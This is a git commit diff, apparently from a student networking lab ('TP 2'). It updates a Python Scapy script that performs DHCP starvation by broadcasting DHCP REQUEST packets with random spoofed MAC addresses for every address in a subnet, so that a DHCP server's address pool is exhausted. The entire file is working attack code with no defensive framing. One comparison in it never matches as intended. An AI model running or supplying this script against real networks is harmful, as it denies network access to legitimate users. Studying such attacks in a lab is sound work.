d484de138e3fe0873868ea39613df08e92f67866
carambole25 <carambole258@gmail.com>
2026-04-01 16:17:18 +0200

    script qui marche

--- TP 2/dhcp_starvation.py
+++ TP 2/dhcp_starvation.py
@@ -1,26 +1,41 @@
 from scapy.all import *
 import sys
+import time
+from ipaddress import ip_network, IPv4Address
 
-def dhcp_starvation(dhcp_server, network):
-    while True:
-        mac = RandMAC()
-        
-        dhcp_discover = (
-            Ether(dst='ff:ff:ff:ff:ff:ff', src=mac) /
-            IP(src='0.0.0.0', dst='255.255.255.255') /
-            UDP(sport=68, dport=67) /
-            BOOTP(op=1, chaddr=mac) /
-            DHCP(options=[
-                ('message-type', 'discover'),
-                ('server_id', dhcp_server),
-                ('end')
-            ])
-        )
+conf.checkIPaddr = False
 
-        sendp(dhcp_discover, iface=conf.iface, verbose=0)
+def dhcp_starvation(dhcp_server, network_str):
+    
+    try:
+        while True:
+            for i in range(254):
+                ip = ".".join(network_str.split(".")[:-1]) + "." + str(i)
+                if ip == IPv4Address(dhcp_server):
+                    continue
 
+                mac = RandMAC()
+                request = (
+                    Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
+                    IP(src="0.0.0.0", dst="255.255.255.255") /
+                    UDP(sport=68, dport=67) /
+                    BOOTP(op=1, chaddr=mac) /
+                    DHCP(options=[
+                        ('message-type', 'request'),
+                        ('requested_addr', str(ip)),
+                        ('server_id', dhcp_server),
+                        ('end')
+                    ])
+                )
+                print(ip)
+                sendp(request, iface=conf.iface, verbose=0)
+
+            time.sleep(3)
+
+    except KeyboardInterrupt:
+        print("Ctrl-c")
 
 dhcp_server = sys.argv[1]
 network = sys.argv[2]
 
-dhcp_starvation(dhcp_server)
+dhcp_starvation(dhcp_server, network)
